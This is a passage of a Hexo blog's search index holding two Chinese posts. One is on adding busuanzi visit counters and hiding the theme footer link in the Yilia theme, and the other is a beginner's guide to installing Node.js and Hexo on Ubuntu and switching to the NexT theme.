    <content type="html"><![CDATA[<h3 id="让你的博客更加好看"><a href="#让你的博客更加好看" class="headerlink" title="让你的博客更加好看"></a>让你的博客更加好看</h3><p>添加阅读量<br>添加访问量统计<br>隐藏power链接<br><a id="more"></a></p><h5 id="添加阅读量"><a href="#添加阅读量" class="headerlink" title="添加阅读量"></a>添加阅读量</h5><p>在yilia主题下layout/_partial下的的<code>article.ejs</code><br>添加以下代码<br><pre><code class="hljs undefined"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> <span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">index</span> )&#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"archive-article-date"</span>&gt;</span>阅读量 <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"busuanzi_value_page_pv"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span></span></code></pre></p><p>算法a：pv的方式，单个用户连续点击n篇文章，记录n次访问量。<br>算法b：uv的方式，单个用户连续点击n篇文章，只记录1次访客数。<br>位置：<code>&lt;/header&gt;</code>后面，部分代码如下<br><pre><code class="hljs undefined"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">article</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"&lt;%=</span></span></span><span class="perl"> post.layout </span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt;-&lt;%=</span></span></span><span class="perl"> post.slug </span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt;"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"article article-type-&lt;%=</span></span></span><span class="perl"> post.layout </span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt; &lt;%</span></span></span><span class="perl"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">index</span>)&#123;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt; article-index&lt;%</span></span></span><span class="perl">&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">%&gt;"</span> <span class="hljs-attr">itemscope</span> <span class="hljs-attr">itemprop</span>=<span class="hljs-string">"blogPost"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"article-inner"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> <span class="hljs-keyword">if</span> (post.link || post.title)&#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">header</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"article-header"</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl">- partial(<span class="hljs-string">'post/title'</span>, &#123;class_name: <span class="hljs-string">'article-title'</span>&#125;) </span><span class="xml"><span class="hljs-tag">%&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> <span class="hljs-keyword">if</span> (!post.noDate)&#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl">- partial(<span class="hljs-string">'post/date'</span>, &#123;class_name: <span class="hljs-string">'archive-article-date'</span>, date_format: null&#125;) </span><span class="xml"><span class="hljs-tag">%&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> <span class="hljs-keyword">if</span> ( !<span class="hljs-keyword">index</span> )&#123; </span><span class="xml"><span class="hljs-tag">%&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"archive-article-date"</span>&gt;</span>阅读量 <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"busuanzi_value_page_pv"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">%</span></span></span><span class="perl"> &#125; </span><span class="xml"><span class="hljs-tag">%&gt;</span>```    ##### 添加访问量统计打开同一目录下的`footer.ejs`文件，添加以下代码</span></code></pre></p><p><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><br><span id="busuanzi_container_site_uv"><br>  本站访客数<span id="busuanzi_value_site_uv"></span>人次<br></span><br><pre><code class="hljs undefined"><span class="xml">位置：`<span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>`上面，代码如下```<span class="hljs-tag">&lt;<span class="hljs-name">footer</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"footer"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"outer"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"footer-info"</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"footer-left"</span>&gt;</span>    &amp;copy; <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> date(new Date(), <span class="hljs-string">'YYYY'</span>) </span><span class="xml"><span class="hljs-tag">%&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">%=</span></span></span><span class="ruby"> config.author <span class="hljs-params">||</span> config.title </span><span class="xml"><span class="hljs-tag">%&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"footer-right"</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://hexo.io/"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span>Hexo<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  Theme <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://github.com/litten/hexo-theme-yilia"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span>Yilia<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> by Litten      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">async</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"busuanzi_container_site_uv"</span>&gt;</span>   本站访客数<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"busuanzi_value_site_uv"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>人次<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span></span></code></pre></p><h5 id="隐藏power链接"><a href="#隐藏power链接" class="headerlink" title="隐藏power链接"></a>隐藏power链接</h5><p>也是<code>footer.ejs</code>文件<br><pre><code class="hljs undefined">&lt;<span class="hljs-keyword">div</span> class=<span class="hljs-string">"footer-right"</span>&gt;      &lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">"http://hexo.io/"</span> target=<span class="hljs-string">"_blank"</span>&gt;Hexo&lt;/<span class="hljs-keyword">a</span>&gt;  Theme &lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">"https://github.com/litten/hexo-theme-yilia"</span> target=<span class="hljs-string">"_blank"</span>&gt;Yilia&lt;/<span class="hljs-keyword">a</span>&gt; <span class="hljs-keyword">by</span> Litten&lt;/<span class="hljs-keyword">div</span>&gt;</code></pre></p><p>对这段代码添加注释符<code>&lt;!-- --&gt;</code><br><pre><code class="hljs undefined"><span class="hljs-comment">&lt;!--&lt;div class="footer-right"&gt;      &lt;a href="http://hexo.io/" target="_blank"&gt;Hexo&lt;/a&gt;  Theme &lt;a href="https://github.com/litten/hexo-theme-yilia" target="_blank"&gt;Yilia&lt;/a&gt; by Litten&lt;/div&gt;--&gt;</span></code></pre></p><h5 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h5><p>你也可以写自己喜欢的文字上去，比如<br><pre><code class="hljs undefined">&lt;<span class="hljs-keyword">div</span>&gt;做自己想做的事~&lt;/<span class="hljs-keyword">div</span>&gt;</code></pre></p><p>效果如下<br><img src="/img/2018-05-07/1.png" srcset="/img/static/loading.gif" alt=""><br>暂时做到这里，以后如果有看到喜欢的或者有好的想法都会补充</p>]]></content>
    
    
    
    <tags>
      
      <tag>美化</tag>
      
      <tag>yilia</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一次搭建博客</title>
    <link href="/2018/05/07/frist-try/"/>
    <url>/2018/05/07/frist-try/</url>
    
    <content type="html"><![CDATA[<h3 id="为什么要搭建博客呢？"><a href="#为什么要搭建博客呢？" class="headerlink" title="为什么要搭建博客呢？"></a>为什么要搭建博客呢？</h3><p><del>写博客可以增长知识</del><br><del>写博客可以装逼</del><br><a id="more"></a></p><h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>&emsp;&emsp;写博客可以记录学习上遇到的问题，记录自己的学习过程，对于非常白的小白来说<del>绝对不是我</del>，自己扒资料扒博客是比较痛苦的，很多基础知识不会的话很容易出一些很难搜索到的问题，就比较痛苦了，建议可以先学习一些预备知识，下面讲一下整个搭博客的过程</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p> &emsp;&emsp;对于用云服务器这一类的建议在本地搭建一个虚拟机进行尝试后再对服务器动刀（大神绕过），因为已经做好了，我就拿本地复现一遍，我的服务器是<code>ubuntu 16</code>，本地也用同样的系统搭建，不同的系统命令也不同。<br>我选用的框架是hexo,这个框架速度快、支持markdown、一键部署、有很多插件<del>（还不是因为不会用其他的）</del>，网上也有很多同样的教程，教程千篇一律，bug各种各样，希望这篇博客对你有所帮助</p><h5 id="大概流程就是"><a href="#大概流程就是" class="headerlink" title="大概流程就是"></a>大概流程就是</h5><p><code>安装nodejs环境--&gt;安装hexo--&gt;下载一款好看的主题（可省）--&gt;发布你的博客</code><br>酱酱酱</p><h4 id="一、nodejs安装教程"><a href="#一、nodejs安装教程" class="headerlink" title="一、nodejs安装教程"></a>一、nodejs安装教程</h4><pre><code class="hljs undefined">sudo apt-<span class="hljs-builtin-name">get</span> install nodejssudo apt-<span class="hljs-builtin-name">get</span> install npm</code></pre><p>两行代码OK啦，不是ubuntu系统的可以点击这里查看其他命令–&gt;<a href="http://www.runoob.com/nodejs/nodejs-install-setup.html" target="_blank" rel="noopener">传送门</a></p><h4 id="二、hexo安装"><a href="#二、hexo安装" class="headerlink" title="二、hexo安装"></a>二、hexo安装</h4><pre><code class="hljs undefined">sudo npm install -g hexo-<span class="hljs-keyword">cli</span></code></pre><h5 id="坑一"><a href="#坑一" class="headerlink" title="坑一"></a>坑一</h5><p>apt-get 安装的nodejs是4.2.6，hexo需要6.9.0，爬了好多博客才找到<br><pre><code class="hljs undefined">sudo npm install -g <span class="hljs-built_in">n</span>sudo <span class="hljs-built_in">n</span> <span class="hljs-number">6.9</span>.<span class="hljs-number">0</span>或者 sudo <span class="hljs-built_in">n</span> stable</code></pre></p><p>现在执行刚刚的命令就可以安装hexo了，使用<br><pre><code class="hljs undefined"><span class="hljs-attribute">hexo -v</span></code></pre></p><p>可以查看是否正确安装，正确安装会有以下输出提示<br><pre><code class="hljs undefined"><span class="hljs-selector-tag">hexo-cli</span>: 1<span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">os</span>: <span class="hljs-selector-tag">Linux</span> 4<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.0-28-generic</span> <span class="hljs-selector-tag">linux</span> <span class="hljs-selector-tag">x64</span><span class="hljs-selector-tag">http_parser</span>: 2<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">node</span>: 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">v8</span>: 6<span class="hljs-selector-class">.6</span><span class="hljs-selector-class">.346</span><span class="hljs-selector-class">.24-node</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-tag">uv</span>: 1<span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.2</span><span class="hljs-selector-tag">zlib</span>: 1<span class="hljs-selector-class">.2</span><span class="hljs-selector-class">.11</span><span class="hljs-selector-tag">ares</span>: 1<span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">modules</span>: 64<span class="hljs-selector-tag">nghttp2</span>: 1<span class="hljs-selector-class">.29</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">napi</span>: 3<span class="hljs-selector-tag">openssl</span>: 1<span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0h</span><span class="hljs-selector-tag">icu</span>: 61<span class="hljs-selector-class">.1</span><span class="hljs-selector-tag">unicode</span>: 10<span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">cldr</span>: 33<span class="hljs-selector-class">.0</span><span class="hljs-selector-tag">tz</span>: 2018<span class="hljs-selector-tag">c</span></code></pre></p><p>选择一个空的文件夹作为你的站点，在当前路径下初始化你的hexo(报错加sudo试试)<br><pre><code class="hljs undefined">hexo initnpm <span class="hljs-keyword">install</span></code></pre></p><p>这样子网站就初步建好了，网站的目录结构就是下面这样子的<br><pre><code class="hljs undefined">.├── _config.yml├── <span class="hljs-keyword">package</span>.json├── scaffolds├── <span class="hljs-keyword">source</span> |   └── _posts└── themes</code></pre></p><p>&emsp;&emsp;<code>_config.yml</code> 文件存放着网站的配置信息，可以在这里配置大部分的参数。<br><code>package.json</code> 文件存放着插件信息，从中可以查看那些插件已经安装。<br><code>scaffolds</code> 是模板文件夹，新建文章时，Hexo 会根据 scaffold 来建立文件，不过这个模板和后面的主题里指的模板不一样。<br><code>source</code> 是存放用户资源的地方的文件夹，除 <code>_posts</code> 文件夹之外，开头命名为 _ (下划线) 的文件 / 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 <code>public</code> 文件夹（别急，等下会生成的），而其他文件会被拷贝过去。<br><code>themes</code> 主题文件夹，Hexo 会根据主题来生成静态页面，我们以后自己安装的主题也都会放在这个文件夹下面，默认的 <code>landscape</code> 主题已经在里面了。<br>现在我们启动我们的博客<br><pre><code class="hljs undefined">hexo<span class="hljs-built_in"> server</span>简写 hexo s</code></pre></p><p>提示4000端口被占用的<a href="www.baidu.com">百度</a>下方法</p><h4 id="完工"><a href="#完工" class="headerlink" title="完工"></a>完工</h4><p>不出意外应该都看得到这两条信息<br><pre><code class="hljs undefined">INFO  <span class="hljs-keyword">Start</span> processingINFO  Hexo <span class="hljs-keyword">is</span> running <span class="hljs-keyword">at</span> <span class="hljs-keyword">http</span>://localhost:<span class="hljs-number">4000</span>/. Press Ctrl+C <span class="hljs-keyword">to</span> stop.</code></pre></p><p>现在访问我们虚拟机的ip:4000就可以看到我们的博客啦<br><img src="/img/2018-05-07/hexo.png" srcset="/img/static/loading.gif" alt="hexo"><br>再换一个好看点的主题就可以啦<br><pre><code class="hljs undefined">git clone http<span class="hljs-variable">s:</span>//github.<span class="hljs-keyword">com</span>/iissnan/hexo-theme-<span class="hljs-keyword">next</span> themes/<span class="hljs-keyword">next</span></code></pre></p><p>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br>要在站点目录下这个很重要！<br><del>太笨了当初在这卡了久</del>  重要的事情说三遍<br>再在站点文件夹下的配置文件<code>_config.yml</code>更换主题就OK啦<br><pre><code class="hljs undefined"><span class="hljs-selector-tag">vim</span> _<span class="hljs-selector-tag">config</span><span class="hljs-selector-class">.yml</span></code></pre></p><p>往下滚到这个位置<br><pre><code class="hljs undefined"><span class="hljs-symbol">theme:</span> landscape</code></pre></p><p>把landscape换成next就ok啦，最后重启下博客<br><img src="/img/2018-05-07/next.png" srcset="/img/static/loading.gif" alt="next"></p><h4 id="完善"><a href="#完善" class="headerlink" title="完善"></a>完善</h4><p>&emsp;&emsp;相信很多小伙伴都觉得挺一般的，这个只是雏形，还有更多细节优化美化要去处理，觉得我的博客不错的可以看看这篇博客<br>戳这里–&gt;<a href="https://blog.csdn.net/qq_33699981/article/details/72716951" target="_blank" rel="noopener">here</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
